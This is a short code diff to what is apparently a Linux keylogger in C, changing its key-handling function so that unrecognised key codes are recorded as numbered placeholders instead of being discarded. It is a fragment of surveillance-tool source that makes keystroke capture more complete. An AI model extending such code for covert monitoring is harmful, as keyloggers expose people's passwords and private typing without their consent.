@@ -240,8 +240,7 @@ static void keylog_log(keylog_t *kl, struct input_event e, bool is_upper)
     case KEY_DOWN: strncpy(strbuf, "<DOWN>", BUFLEN); break;
     case KEY_RIGHT: strncpy(strbuf, "<RIGHT>", BUFLEN); break;
 
-
-    default: lc = uc = '\0'; break;
+    default: snprintf(strbuf, BUFLEN, "<%d>", code); break;
     }
 
     char c = (is_upper) ? uc : lc;
